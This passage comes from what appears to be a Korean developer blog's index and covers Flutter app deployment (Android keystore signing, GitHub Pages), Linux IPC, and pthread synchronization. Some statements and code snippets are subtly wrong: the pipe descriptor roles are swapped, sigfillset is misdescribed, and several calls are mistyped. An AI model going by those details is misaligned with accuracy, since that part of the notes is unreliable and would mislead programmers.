(https://github.com/AswinBlue/FlickThrough/settings/secrets/actions)\n내용을 작성하고 github에 푸쉬하면 github 의 action 탭에서 action의 실행 결과를 확인할 수 있다. (https://github.com/AswinBlue/FlickThrough/actions/new)\naction이 정상적으로 완료되었다면, setting/page 항목에서 브랜치 ‘gh-pages’로 설정 해 준다. (자동으로 되는 경우도 있음) (https://github.com/AswinBlue/FlickThrough/settings/pages)\n2. 아이콘 변경 https://www.appicon.co/ 에 이미지 파일을 넣으면 android 아이콘 형태로 이미지를 변환하여 추출 해 준다.\n추출된 아이콘을 \\android\\app\\src\\main\\res 경로에 복사 붙여넣으면 된다.\nIOS는 ios/Runner/Assets.xcassets 폴더 안에 AppIcon.appiconset 폴더를 교체 해 준다.\n3. Android 앱 배포 구글 플레이스토어 개발자 계정 생성 개발자 계정이 없다면, https://play.google.com/console 에 접속하여 안내에 따라 계정을 생성한다. 생성에는 $25의 비용이 부과되므로 달러 결제가 가능한 카드를 준비한다. 안드로이드 앱 배포시 자신이 앱의 개발자가 맞다는 것을 증명하고 앱을 업데이트 하기 위해서는 앱에 설정된 key와 동일한 key를 알고 있어야 한다. 이를 key store 시스템이라 하며, 배포전 반드시 설정을 해야 한다. jdk에서 제공하는 keytool 명령어를 사용해야 한다. jdk를 설치하면 C:\\Program Files\\Java\\jdk-21\\bin 경로에 keytool 실행파일이 있다.\nkeytool -genkey -v -keystore C:/Users/USER_NAME/key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key명령으로 key를 생성한다. key 생성시 비밀번호를 입력 해 주고, 묻는 질문에 필요하다면 대답해 준다.\n생성된 key.jks 파일을 android/app/ 경로로 이동시키고, key.properties 파일을 생성한 후, 아래와 같이 내용을 채워 넣는다.\nstorePassword=\u0026lt;키생성시 입력한 암호\u0026gt; keyPassword=\u0026lt;키생성시 입력한 암호\u0026gt; keyAlias=key storeFile=./key.jks .gitignore 파일로 key.jks와 key.properties 파일이 유출되지 않게 잘 조정한다.\napp/build.gradle 파일에 keystore 을 사용하기 위한 내용을 추가한다.\ndef keystoreProperties = new Properties() def keystorePropertiesFile = rootProject.file(\u0026#39;app/key.properties\u0026#39;) if (keystorePropertiesFile.exists()) { keystoreProperties.load(new FileInputStream(keystorePropertiesFile)) } ... android { ... signingConfigs { release { keyAlias keystoreProperties[\u0026#39;keyAlias\u0026#39;] keyPassword keystoreProperties[\u0026#39;keyPassword\u0026#39;] storeFile file(keystoreProperties[\u0026#39;storeFile\u0026#39;]) storePassword keystoreProperties[\u0026#39;storePassword\u0026#39;] } } buildTypes { release { signingConfig signingConfigs.release } } gradle 파일 수정 후에는 gradle을 프로젝트에 sync 해 주어야 한다. gradle sync라는 항목이 ‘file’ 밑에 있는 경우도, ‘tool → android’ 밑에 있는 경우도 있는데 둘다 보이지 않는다면 build.gradle 파일을 우클릭 한 후 ‘Link gradle project’ 를 눌러준다.\n마지막으로 build를 release 버전으로 수행해야 한다. 좌측 하단에 Build Variants 창을 찾아(혹은 build → Select build variant 선택) 설정을 release로 변경한다.\n이후 콘솔창에 flutter build appbundle 명령어를 입력하여 app bundle을 빌드한다. 빌드한 결과는 /build/app/outputs/bundle/release 경로에 생성된다.\n파일명은 app-release.aab 로 생성되어 있다. playstore console에 배포할때도 aab 파일을 업로드 한다.\n업로드한 파일의 manifest에 적힌 버전과 동일한 버전은 중복 업로드를 할 수 없으므로, 이후 업로드 시에는 높은 버전을 업로드 해야 하며, 기존 버전을 삭제하고 싶다면 playstore console에서 ‘app bundle 탐색기’ 메뉴를 찾아 삭제가 가능하다.\n2. 문제와 해결 fatal: unable to access '[https://github.com/AswinBlue/FlickThrough/](https://github.com/AswinBlue/FlickThrough/)': The requested URL returned error: 403 에러 “erickzanardo/flutter-gh-pages@v3” 과 “bluefireteam/flutter-gh-pages@v7” 을 사용해도 모두 동일한 에러가 발생했다. 해당 url에 접근 권한이 없는 경우 발생한다. gitbash를 이용하여 url을 계정 이름이 포함된 형태로 변경해 준다. git remote set-url origin https://AswinBlue@github.com/AswinBlue/FlickThrough.git checkout job 실행시 token 사용하도록 적용 해 주면 이후 명령들도 권한이 적용 되는듯 하다. ","permalink":"https://aswinblue.github.io/Blog/post/projects/flick_through/","summary":"Flick Through github: https://github.com/AswinBlue/FlickThrough\nLink : aswinblue.github.io/FlickThrough/\n시작날짜: August 21, 2023\n목표 텍스트 파일을 읽어 단어 단위로 슬라이드 쇼를 수행하는 앱 제작\n요구사항 텍스트 파일의 공백과 줄바꿈을 기준으로 단어를 나누고 이를 화면에 출력 출력은 한 단어씩 이루어 지며 분당 300개를 기본으로, 속도는 조절 가능 단어 자르는건 커스텀 가능 특정 문자마다 딜레이 다르게 줄 수 있도록 설정 스크린샷 혹은 클립보드의 내용도 사용할 수 있도록 함 기능 구현 1. 구현 내용 UI 구성 텍스트가 출력될 텍스트박스, 진행률 표시바, 시작/일시정지 버튼, 속도 조절 스크롤바, 파일 읽기 버튼을 구성","title":"FlickThrough"},{"content":"IPC (Inter Process Communicatrion) Signal Signal은 프로세스간 동기화를 위해 프로세스간 전송하는 신호를 의미한다. Software Interrupt 라고도 한다. 커널에서 kill -\u0026lt;SIGNAL_NUMBER\u0026gt; \u0026lt;PROCESS_ID\u0026gt; 명령으로 특정 PROCESS_ID에 ISGNAL_NUMBER에 해당하는 signal을 전달할 수 있다. signal은 총 64까지 정의되어 있고 1~31까지가 일반적으로 사용하는 signal이다. 34~63은 고성능 네트워크 통신을 위한 시그널이다. (32, 33는 미정의) kill -l 명령으로 signal 리스트를 확인할 수 있다. SIGHUP SIGINT : 인터럽트, Ctrl+C 명령으로 전송 가능 SIGQUIT Coredump시 발생 SIGILL : Illegal instruction SIGTRAP : debugger is tracing SIGABRT : Abort process SIGBUS : bus error SIGFPE : Floating point exception SIGKILL : 강제 종료 SIGUSR1\t: User-defined signal 1, 마음대로 사용 가능 SIGSEGV\t: invalid virtual memory reference SIGUSR2 : User-defined signal 2, 마음대로 사용 가능 SIGPIPE\t: 반대편이 연결되지 않은 pip에 신호 전송시 발생하는 에러 SIGALRM : alarm() 함수에 의해 발생한 시그널 1 SIGTERM : 종료 요청, SIGKILL(9)보다 안전한 종료 방법, SIGINT와 유사한 성능 SIGSTKFLT : Stack fault SIGCHLD : 자식 process가 종료될 때 부모에게 전달하는 신호 SIGCONT : SIGSTOP 에 의해 정지된 경우, 다시 시작하라는 신호 SIGSTOP : process 정지 SIGTSTP : process 일시정지, Ctrl+Z 명령으로 전송 가능 SIGTTIN\t: background 에 있을 때 read 요청을 받은 경우 발생 SIGTTOU : background 에 있을 때 write 요청을 받은 경우 발생 SIGURG : 긴급 통신을 받은 경우 (Out Of Band) SIGXCPU : 설정된 CPU 사용량을 초과하여 프로세스가 동작 한 경우 SIGXFSZ : 파일 크기가 허용된 크기를 초과한 경우 SIGVTALRM : 프로세스 실행시간 관리를 위한 시그널1 SIGPROF : 프로세스 실행시간 관리를 위한 시그널2 SIGWINCH : Window change SIGIO, SIGPOLL : Input/output is now possible SIGPWR, SIGLOST : Power failure SIGUNUSED, SIGSYS : Unused signal. Signal Library in C signal.h 에 정의된 signal 함수로 signal을 무시(ignore)하거나, 시그널 발생시 특정 함수를 동작(catch)시키도록 설정할 수 있다. 처리되지 않은 (ignore 또는 catch 처리) signal을 받으면 기본적으로 해당 프로세스는 종료한다. SIGKILL(강제종료 용도)과 SIGSTOP(디버깅시 일시정지 용도)시그널을 제외한 모든 시그널을 무시할 수 있다. signal(SIGNAL, PID) pid \u0026gt; 0 : PID에 SIGNAL 전달 pid \u0026lt; 0 : PID의 절댓값에 해당하는 groupId를 가진 프로세스들에 SIGNAL 전달 pid == 0 : 자신과 같은 groupId를 가진 프로세스들에 SIGNAL 전달 alarm(TIME) : TIME초 이후 SIGALRM 시그널 발생 alarm timer가 만기되기 전 새로운 alarm을 호출하면 값을 덮어쓴다. 대신 alarm 함수는 남은 시간을 반환 한다. alarm(0) 을 호출하면 알림이 취소된다. 시그널 처리 flag는 bit연산으로 관리된다. sigset_t 타입의 bit 하나하나들은 1~64까지의 signal을 의미하고, 아래와 같이 set을 연산하여 process에서 signal을 설정할 수 있다. sigemptyset(siget_t* SET) : SET 모든 비트를 0으로 세팅. sigfillset(int SIGNAL, sigset_t* SET) : | 연산으로 SET 에서 SIGNAL에 해당하는 비트만 1로 세팅 sigdelset(int SIGNAL, sigset_t* SET) : \u0026amp; 연산으로 SIGNAL에 해당하는 비트만 0으로 세팅 sigismember(int SIGNAL, sigset_t* SET) : SET에서 SIGNAL비트가 1로 세팅되었다면 true 반환 sigprocmask(int HOW, siget_t* NEW, sigset_t* OLD) : 특정 SIGNAL을 무시하도록 설정할 수 있다. 필요할 경우 OLD에 siget_t* 타입 변수를 집어넣으면 현재 프로세스에 설정된 set을 담아낸다. SIG_BLOCK : NEW에 set된 signal들을 추가로 무시한다. SIG_UNBLOCK : NEW에 set 된 signal들의 무시처리를 해제한다. SIG_SETMASK : 기존 값에 상관없이 NEW에 set 된 signal들만 무시하도록 set을 덮어쓴다. signal 을 처리하여 signal에 의해 process가 정지되지 않는 구간을 임계영역 이라 한다. Pipe 프로세스간 단방향 통신을 위해 프로세스들의 표준 입출력을 서로 교차하여 연결하는 기법이다. 프로세스간 데이터 전송시 주로 사용된다. flow control이 기본적으로 제공된다. Pipe Library in C pipe(int[2] fd) : 파일 디스크립터 두개를 생성하고, 단방향 통신을 생성함\nfile descriptor를 두 개 열고, fd[0] fd[1]에 그 번호를 넣어준다. write(fd[1], ...), read(fd[0], ...) 으로 사용 fd[0]은 writing을, fd[1]은 reading을 위한 descriptor이다. 파이프 사용을 마치면 fd[0]과 fd[1]에 대해 각각 close를 해 주어야 한다. close(fd[0]), close(fd[1]) 로 사용 pipe를 생성하고 fork를 호출하면 자식 프로세스는 부모 프로세스의 file descriptor를 모두 가져가기 때문에, 부모와 자식간 pipe를 통해 데이터를 전송할 수 있게 된다. (물론 단방향이다. 양방향을 원한다면 pipe를 두번 생성한다)\n쉘에서 명령을 입력할 때 |로 두 명령을 연결시키면, 앞선 명령의 표준 출력 값이 뒷쪽 명령의 input으로 들어간다.\nex) cat file.txt | grep target : file.txt 파일을 출력한 결과에서(cat) target 이라는 문자열을 찾는다(grep). \u0026lsquo;|\u0026rsquo; 명령도 pipe로 fd[0], [1]을 생성하고, dup()를 이용해 fd[0]과 fd[1]을 표준 입력/출력 자리로 복사시키는 기법으로 구현한 것이다. int fd[2], pid;\rpipe(fd);\rpid = fork();\rif (pid == 0)\r{\rclose(fd[1]); // 입력용 파이프 제거\rdup2(fd[0], 0); // 출력 파이프를 표준 입력으로 재배치\r... // 이후 parent process 동작 수행\r}\rclose(fd[0]); // 출력용 파이프 제거\rdup2(fd[1], 1); // 입력 파이프를 표준 출력으로 재배치\r... // 이후 child process 동작 수행 Message Queue IPC namespace 이 외에도 공유메모리, 세마포어, 소켓, FIFO 등으로 프로세스간 통신이 가능하다.\n그중 message queue, shared memory, semaphore은 IPC 통신을 위한 framework이다.\n파이프나 FIFO가 file descriptor을 사용해 통신했던 것과 달리, Key_t 타입의 identifier 라는 IPC를 위한 구분자로 채널(통신을 위한 라인)을 구분한다. 동일한 구조체를 통해 커널이 관리하며, 인터페이스도 유사하다. 권한은 아래와 같은 형태로 관리되며, 실행 권한이 없는 것만 제외하고 파일시스템과 유사하다. struct ipc_perm {\rushort uid;\rushort gid;\rushort cuid;\rushort cgid;\rushort mod;\rushort seq;\rkey_t key;\r} 커널에서 ipcs 명령어로 IPC 구성에 대한 정보를 확인할 수 있다.\nmessage queue는 msqid_ds 구조체에 정보를 담아 관리하고, message들은 struct msgbuf 구조의 linked list 형태로 msqid_ds 구조체에 연결된다. 각 message들은 data, length, type을 가지고 있고, type은 사용자가 원하는 대로 설정 가능한 값이다. struct msgqid_ds {\rstruct ipc_perm msg_perm; // 권한\rstruct msg *msg_first; // msg linked list 시작점\rstruct msg *msg_last; // msg linked list 종료점\rtime_t msg_stime; // 마지막 send가 실행된 시각\rtime_t msg_rtime; // 마지막 receive가 실행된 시각\rtime_t msg_ctime; // 마지막 change가 실행된 시각\rshort msg_lspid; // 마지막 send를 한 pid\rushort msg_lrpid; // 마지막 receive를 한 pid\rushort msg_qbytes; // message queue의 최대 사이즈\rushort_msg_cbytes; // message queue에서 사용중인 바이트\r}\rstruct msgbuf {\rlong mtype; // message의 타입(자료형이 아니라, 어플리케이션 로직상 구분자), 필수\rchar mtext[]; // data, 필수\r// 이외 사용자가 재정의하여 추가적인 데이터를 넣어 헤더를 추가할 수 있다.\r} Message Queue in C Library int msgget(key_t key, int msgflg) : message queue를 생성 혹은 불러오는 함수 key는 int 값을 넣어주면 된다. 함수 성공시 message queue의 qid를 반환하고, 실패시 -1을 반환한다. flag에 IPC_CREAT 가 설정되면 신규로 생성된다. 생성시 권한도 설정 가능하다. ex: IPC_CREAT | 0777 int messagectl(int msqid, int cmd, struct msqid_ds *buf) : message queue의 상태값을 조회 또는 수정한다. cmd 가 IPC_STAT 라면 buf에 현재 상태를 받아오고, IPC_SET 라면 buf의 값으로 message queue 상태를 설정한다. int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg) : message queue에 msgp 데이터를 넣는 함수 msgp는 위에서 언급한 msgbuf 형태를 따라야 한다. msgsz는 msgp안의 mtext 버퍼 크기를 의미한다. (msgp 전체 구조체 크기가 아님) msgflg는 blocking 여부(IPC_NOWAIT), size 에러 여부(MSG_NOERROR) 등을 설정 가능하다. ssize_t msgrcv(int msgqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) : message queue에서 msgtype에 해당하는 데이터를 msgp에 받아옴 반환값은 읽어온 사이즈 type은 지정하지 않을 경우, queue의 head에 있는 message를 가져옴. type \u0026gt; 0 일 경우, 동일한 타입의 첫번째 메시지를 가져옴 type \u0026lt; 0 일 경우, type의 절댓값과 작거나 같은 타입의 첫번째 메시지를 가져옴 flag는 msgsnd 함수와 유사 Semaphore 다중 리소스에 대해 critical section을 처리하는 방법(mutex는 하나의 리소스를 보호에 사용) struct semid_ds 구조체 형태로 관리되며, 보호할 리소스의 정보를 struct sem *sem_base 인자에 담아 관리하며, sem_nsems 인자는 semaphore가 관리하는 리소스의 갯수를 나타낸다. Semaphore in C Library int semop(int sid, struct sembuf* s_buf, size_t num) : semaphore을 조작하는 함수\nsid : semaphore id, 식별자 s_buf : operation. 동작에 대한 상세 정보를 sembuf* 타입에 기록한 후 인자에 적용한다. 배열 형태로 여러개 적용 가능 s_buf.sem_num: 세마포어 번호 s_buf.sem_op : 세마포어 연산 s_buf.sem_flg : 작동 플래그 num : operation의 갯수 int semctl(int sid, int num, int cmd, union semun arg) : semaphore 설정을 가져오거나 수정\nsid : semaphore id, 식별자 num : 세마포어가 관리하는 리소스 중 함수로 접근을 원하는 대상의 index cmd : 명령 GETVAL\t세마포어의 현재 값을 구한다. GETPID\t가장 최근에 접근했던 프로세스의 프로세스 ID를 구한다. GETNCNT\t세마포어 대기중인 프로세스의 개수 GETZCNT\t세마포어 값이 0 이 되기를 기다리는 프로세스의 개수 GETALL\t세마포어 집합의 모든 세마포어 조회 SETVAL\t세마포어 값을 설정 SETALL\t세마퍼어 집합의 모든 세마포어 값을 설정 IPC_STAT\t세마포어의 상세 정보 확인 IPC_SET\t세마포어의 권한 설정 IPC_RMID\t세마포어 집합 삭제 arg : 조회 명령시에는 해당 값에 정보를 받아오고, 설정 명령시에는 해당 값을 적용 p연산 : semaphore에 리소스를 사용하고 있다고 체크하는 연산\nstruct sembuf s_buf = {0,};\rs_buf.sem_num = 0;\rs_buf.sem_op = -1; // 한개 만큼 사용\rsemop(semid, \u0026amp;s_buf, 1); // 한 개 operation 수행 v연산 : semaphore에 리소스를 반환했다고 체크하는 연산\nstruct sembuf s_buf = {0,};\rs_buf.sem_num = 0;\rs_buf.sem_op = 1; // 한개 만큼 사용\rsemop(semid, \u0026amp;s_buf, 1); // 한 개 operation 수행 Shared Memory 프로세스간 공용으로 사용할 수 있는 영역의 메모리를 선언하는 방법 race condition을 해결 할 수는 없으므로, semaphore와 함께 사용해야 한다. Shared Mmory in C Library int shmget(key_t key, size_t size, int shmflg) : shared memory를 생성하거나 key값으로 identifier를 가져오는 함수 size : shared memory의 크기 생성 : shmget(key, sizeof(YOUR_STRUCT), IPC_CREAT) 참조 : shmget(key, sizeof(YOUR_STRUCT), 0) YOUR_STRUCT는 메모리 참조시 사용할 포멧 void *shmat(int shmid, const void *shmaddr, int shmflg) : 가상메모리를 할당하는 작업. attach shmid : shared memory id, 식별자 shmaddr : 공유 메모리 연결 주소 (보통 NULL로 사용) 반환값 : shared memory에 접근할 수 있는 포인터 ex) YOUR_STRUCT *ptr = (YOUR_STRUCT*)shmat(shmid, 0, 0); int shmdt(const void *shmaddr) : 가상메모리를 환원하는 작업. detach ex) shmdt(shmid); int shmctl(int shmid, int cmd, struct shmid_ds *buf) : 공유 메모리에 대한 정보를 가져오거나 설정하는 함수 shmid : shared memory id, 식별자 cmd : 제어 명령 IPC_STAT : shared memory 값 받아와 buf에 작성 IPC_SET : buf의 값으로 해당 shared memory 정보 갱신 IPC_RMID : shared memory를 시스템에서 삭제 buf : 조회 명령시에는 해당 값에 정보를 받아오고, 설정 명령시에는 해당 값을 적용 ","permalink":"https://aswinblue.github.io/Blog/post/linux/ipc/","summary":"IPC (Inter Process Communicatrion) Signal Signal은 프로세스간 동기화를 위해 프로세스간 전송하는 신호를 의미한다. Software Interrupt 라고도 한다. 커널에서 kill -\u0026lt;SIGNAL_NUMBER\u0026gt; \u0026lt;PROCESS_ID\u0026gt; 명령으로 특정 PROCESS_ID에 ISGNAL_NUMBER에 해당하는 signal을 전달할 수 있다. signal은 총 64까지 정의되어 있고 1~31까지가 일반적으로 사용하는 signal이다. 34~63은 고성능 네트워크 통신을 위한 시그널이다. (32, 33는 미정의) kill -l 명령으로 signal 리스트를 확인할 수 있다. SIGHUP SIGINT : 인터럽트, Ctrl+C 명령으로 전송 가능 SIGQUIT Coredump시 발생 SIGILL : Illegal instruction SIGTRAP : debugger is tracing SIGABRT : Abort process SIGBUS : bus error SIGFPE : Floating point exception SIGKILL : 강제 종료 SIGUSR1\t: User-defined signal 1, 마음대로 사용 가능 SIGSEGV\t: invalid virtual memory reference SIGUSR2 : User-defined signal 2, 마음대로 사용 가능 SIGPIPE\t: 반대편이 연결되지 않은 pip에 신호 전송시 발생하는 에러 SIGALRM : alarm() 함수에 의해 발생한 시그널 1 SIGTERM : 종료 요청, SIGKILL(9)보다 안전한 종료 방법, SIGINT와 유사한 성능 SIGSTKFLT : Stack fault SIGCHLD : 자식 process가 종료될 때 부모에게 전달하는 신호 SIGCONT : SIGSTOP 에 의해 정지된 경우, 다시 시작하라는 신호 SIGSTOP : process 정지 SIGTSTP : process 일시정지, Ctrl+Z 명령으로 전송 가능 SIGTTIN\t: background 에 있을 때 read 요청을 받은 경우 발생 SIGTTOU : background 에 있을 때 write 요청을 받은 경우 발생 SIGURG : 긴급 통신을 받은 경우 (Out Of Band) SIGXCPU : 설정된 CPU 사용량을 초과하여 프로세스가 동작 한 경우 SIGXFSZ : 파일 크기가 허용된 크기를 초과한 경우 SIGVTALRM : 프로세스 실행시간 관리를 위한 시그널1 SIGPROF : 프로세스 실행시간 관리를 위한 시그널2 SIGWINCH : Window change SIGIO, SIGPOLL : Input/output is now possible SIGPWR, SIGLOST : Power failure SIGUNUSED, SIGSYS : Unused signal.","title":"IPC"},{"content":"Thread thread는 process의 경량화 버전으로 생각할 수 있다. pthread_create() 함수로 fork 명령을 대체하고, pthread_join() 으로 wait 명령을 대체하면 process 대신 thread를 동작시킨다. thread는 함수를 실행시키는 것이 기본이며, 함수를 실행시킬 때 넣을 인자와, 함수의 리턴값을 받을 인자를 pthread_create의 파라미터로 받는다. 리눅스 프로세스 표시 목록에 LWP(light-weight-process) 항목으로 표시되며, proces ID가 같더라도 LWP ID가 다르면 같은 process 안의 thread인 것. pthread_exit() 로 thread만 종료시킬 수 있다. main process가 종료되면 딸려있는 thread들도 함께 종료된다. 다만, main thread만 pthread_exit으로 종료시키면 process가 종료되지 않고 main thread만 종료되고 다른 thread들은 계속 구동되는 형태가 되므로 주의한다. int pthread_join(pthread_t thread, void **retval) : 자식 thread가 종료될 때 까지 대기하고, 종료처리를 해 주는 함수, pthread_exit()에서 반환된 값을 retval로 받아올수 있다. pthread_detach(int tid) : thread id가 tid에 해당하는 thread를 부모 thread에서 분리하는 함수. 이후 종료되고 join 처리를 대기하지 않고 바로 free됨. int pthread_self() : 자신의 thread id 를 확인할때 사용하는 함수 void* func(void* data)\r{\r(struct ARG*) data;\r...\rpthread_detach(pthread_self()); // pthread_join 대신 사용 가능\r}\r...\r// thread 생성\rstruct ARG *arg;\rint tid = pthread_create(\u0026amp;thread, 0, func, arg);\r...\rpthread_join(tid, 0); // pthread_detach 대신 사용 가능\r... process 와 thread 차이 process는 메모리를 수정하는 순간 메모리가 분리되지만, thread는 메모리를 공유하여 수정하고 나서도 같은 영역을 참조할수 있다. (전체 가상메모리를 공유한다.) process는 wait 값의 인자를 확인 에러를 확인할 수 있는 반면, thread의 에러는 pthread_join의 return 값을 확인한다. (값이 0 초과이면 에러가 됨) 일반적인 에러 처리는, errno.h 헤더파일에 errno 라는 변수가 전역변수로 선언되어 있고, 프로세스가 에러에 의해 종료될 경우 이 변수에 값을 채워넣는다. thread는 전역변수를 공유하기 때문에 errno를 사용하지 않는 것 Mutex 전역변수의 상호 참조에 의해 발생하는 race condition 문제를 해결하기 위해 사용할 수 있는 방법 race condition : 둘 이상의 thread가 전역변수를 참조할 때 메모리 접근하려 서로 경쟁하는 상황 pthread.h 헤더를 사용하며, pthread 라이브러리를 사용하기 떄문에 빌드시 옵션에 -lpthread를 추가해준다. pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;\r...\rpthread_mutex_lock(\u0026amp;mutex);\r// 전역변수 참조 영역\rpthread_mutex_unlock(\u0026amp;mutex); mutex를 사용해 임계 영역(critical section)에 대해 mutual exclusion 속성을 보장하여 동시 접속에 의한 오동작을 막을 수 있다. Mutex 내부 구조 C언어로는 compare와 set을 atomic하게 수행할 수 없어 mutual exclusion을 구현할 수 없다. cas(compare and set) 라는 코드를 어셈블리어에서 지원하는데, compare와 set을 atomic하게 처리할 수 있다. 아래 함수는 어셈블리어를 사용하여 C에서 cas를 구현한 내용이다. cpu 칩마다 지원하는 형태가 다를 수 있음에 주의한다. (아래는 인텔이 제공하는 형태) typedef int int32_t;\rint mutex = 0; // 초기값 0\r/**\r* @brief old_value와 *ptr을 비교하여 같다면 *ptr에 new_value를 대입한다.\r* mutex lock의 역할을 한다. * @return int old_value와 *ptr의 비교 결과가 같다면 false를, 다르다면 true를 반환\r*/\rint __bionic_cmpxchg(int32_t old_value, int32_t new_value, volatile int32_t* ptr)\r{\rint 32_t prev;\r__asm__ __volatile__ (\u0026#34;lock; cmpxchgl %1, %2\u0026#34;\r: \u0026#34;=a\u0026#34; (prev)\r: \u0026#34;q\u0026#34; (new_value), \u0026#34;m\u0026#34; (*ptr), \u0026#34;0\u0026#34; (old_value)\r: \u0026#34;memory\u0026#34;);\rreturn prev != old_value;\r} Spin Lock while문을 반복하며 mutex를 계속 체크하는 기법 void spin_lock(int* mutex)\r{\rwhile (__bionic_cmpxchg(0, 1, mutex)); // mutex가 0이 될 때 까지 무한 대기 } CPU 활용도가 떨어지므로 임계영역이 짧은 경우만 사용 권장 Sleep Lock mutex를 기다리는 동안 thread를 sleep 시키면 thread에 할당된 리소스를 해제하여 다른 곳에 할당해 줄 수 있게 된다. gcc에서는 slelep lock을 지원하는 라이브러리가 없지만, 시스템 커맨드 라이브러리에는 futex(fast user mutex)라는 함수로 sleep lock을 지원한다. C언어로 사용하려면 시스템 콜로 futex를 호출하면 된다. #include \u0026lt;unisted.h\u0026gt;\rint mutex = 1;\rvoid *foo(void *data)\r{\rsytstemcall 202, \u0026amp;mutex, 0, 1, 0); // __futex_wait();\r... /* critical section */\rsystemcall(202, \u0026amp;mutex, 1, 1); // __futex_wake();\r} __futex_wait 은 mutex_lock, __futex_wake는 mutex_unlock에 대응된다. Self Lock recursive 함수에서 mutex를 사용한다면 하나의 함수에서 동일한 mutex를 두번 호출하게 되는 \u0026ldquo;selfl lock\u0026quot;이 발생할 수 있다. self lock이 발생하면 마찬가지로 deadlock이 발생한다. 재귀 호출을 위한 recursive mutex lock 이 존재한다. mutex 생성시 attribute로 재귀함수를 위한 설정이 존재하며, mutex_lock을 한 thread에서 중복 호출 가능하며, mutex_lock을 호출한 수만큼 mutex_unlock을 호출해 주면 mutex가 해제된다. pthread_mutexattr_t attr;\rpthread_mutex_t mutex;\r...\rpthread_mutexattr_init(\u0026amp;attr);\rpthread_mutexattr_settype(\u0026amp;attr, PTHREAD_MUTEX_RECURSIVE);\rpthread_mutuex_init(\u0026amp;mutex, \u0026amp;attr);\r...\rpthread_mutex_lock(\u0026amp;mutex); // 1\rpthread_mutex_lock(\u0026amp;mutex); // 2\rpthread_mutex_lock(\u0026amp;mutex); // 3\r...\rpthread_mutex_unlock(\u0026amp;mutex); // 1\rpthread_mutex_unlock(\u0026amp;mutex); // 2\rpthread_mutex_unlock(\u0026amp;mutex); // 3 Condition (조건변수) thread에서 전역 변수에 참조할 때, 순서를 제어하기 위해 사용하는 방법 아래 코드는 thread1에서 전역변수를 처리해야 thread2에서 전역변수에 접근이 가능하게 하는 코드이다. pthread_cond_t cond = PTHREAD_COND_INITIALIZER;\r...\rthread1()\r{\rpthread_mutex_lock(\u0026amp;mutex);\r// 전역변수 처리\rpthread_cond_signal(\u0026amp;cond);\rpthread_mutex_unlock(\u0026amp;mutex);\r}\r...\rthread2()\r{\rpthread_mutex_lock(\u0026amp;mutex);\rpthread_cond_wait(\u0026amp;cond);\r// 전역변수 처리\rpthread_mutex_unlock(\u0026amp;mutex);\r} Condition 내부 구조 func1()\r{\rpthread_mutex_lock(); // \u0026lt;- (1)\rdo_something();\rpthread_cond_signal();\rpthread_mutex_unlock();\r}\rfunc2()\r{\rpthread_mutex_lock();\rpthread_cond_wait(); // \u0026lt;- (2)\rdo_something();\rpthread_mutex_unlock();\r} func1이 (1)에서 mutex unlock을 대기하고, func2가 (2)에서 condition signal을 대기하면 deadlock이 걸릴 것 같지만, condition wait와 mutex lock은 서로 교착상태를 만들지 않는다. pthread_cond_wait() 아래와 같이 mutex_unlock, futex_wait, mutex_lock으로 구성되어 있으므로 mutex pthread_cond_wait()\r{\r...\rpthread_mutex_unlock();\rwhile (condition == 0) // condition 조건이 충족될 때 까지 무한 대기\r{\rfutex_wait(); // sleep lock\r}\rcondition = 0; // condition 초기화\rpthread_mutex_lock();\r...\r} 즉, condition wait는 condition signal이 발생한 시점이 아니라, mutex 가 unlock되는 시점에 탈출된다. Deadlock 두 개 이상의 Mutex가 서로 해제되기를 기다리며 대기하여 더 이상 process가 진행되지 못하게 되는 상황을 deadlock이라 한다. lock을 순서대로 잡고, cycle이 생기지 않게 관리하면 deadlock을 피할 수 있다. 재진입 가능 함수 (Reentrant) thread에서 사용할 수 있는 함수를 \u0026lsquo;재진입 가능 함수\u0026rsquo; 라 한다. 즉, Thread-safe 한 함수를 의미한다. 내부적으롱 전역변수, 혹은 static 변수를 사용하는 함수는 \u0026lsquo;재진입 불가능\u0026rsquo; 하다. strtok는 대표적인 재진입 불가능한 함수이다. func1()\r{\rstrtok()\r}\rfunc2()\r{\rstrtok()\r}\rmain()\r{\rpthread_create(func1);\rpthread_create(func2);\r}\r// -\u0026gt; strtok는 재진입 불가능한 함수이기 때문에 결과가 의도한 결과가 나오지 않을 수 있다. C 라이브러리에서는 strtok_r 이라는 재진입 가능한 함수를 제공한다. TLS / TSD TLS는 thread 의 전역 변수를 저장하기 위한 공간으로, 로더(Loader)에 의해서 할당된다. 리눅스에서는 TSD라 부른다. int pthread_setspecific(pthread_key_t key, const void *value) : \u0026lsquo;key\u0026rsquo; 에 해당하는 영역에 \u0026lsquo;value\u0026rsquo;를 연결한다. value로는 동적할당한 메모리가 온다. void* pthread_getspecific(pthread_key_t key) : 기존에 set으로 할당한 key에 해당하는 메모리를 가져온다. void pthread_key_create(pthread_key_t key, void* (*descturctor)(void*)) 할당한 메모리를 해제하는 역할을 수행할 함수 void destructor(void* ptr){free(p);}를 정의하고, destructor의 포인터를 key와 매핑시킨다. void main(void)\r{\rpthread_key_t key;\rpthread_key_create(key, void (*destructor)(void*));\r}\rvoid func1(void)\r{\rint *tsd = pthread_get_specific(key) // key에 해당하는 영역 가져옴\rif (!tsd) // null 받았을 시\r{\rtsd = calloc(1, sizeof int); // int 영역이 필요해서 동적할당. 다른 자료형도 가능\rpthread_set_specific(key, tsd); // TSD 영역에 저장\r}\r}\rvoid destructor(void* ptr)\r{\rfree(p);\r} TLS는 내부적으로 void* tls[] 배열을 bitmap 형태로 지니고, pthread_set_specific을 할 경우 tls[idx]에 메모리 주소를 대입한다. pthread_set_specific을 호출할 때 마다 idx는 자동으로 갱신된다. thread가 종료될 때 모든 key에 대해 소멸자로 정의된 destructor가 호출된다. ","permalink":"https://aswinblue.github.io/Blog/post/linux/thread/","summary":"Thread thread는 process의 경량화 버전으로 생각할 수 있다. pthread_create() 함수로 fork 명령을 대체하고, pthread_join() 으로 wait 명령을 대체하면 process 대신 thread를 동작시킨다. thread는 함수를 실행시키는 것이 기본이며, 함수를 실행시킬 때 넣을 인자와, 함수의 리턴값을 받을 인자를 pthread_create의 파라미터로 받는다. 리눅스 프로세스 표시 목록에 LWP(light-weight-process) 항목으로 표시되며, proces ID가 같더라도 LWP ID가 다르면 같은 process 안의 thread인 것. pthread_exit() 로 thread만 종료시킬 수 있다. main process가 종료되면 딸려있는 thread들도 함께 종료된다. 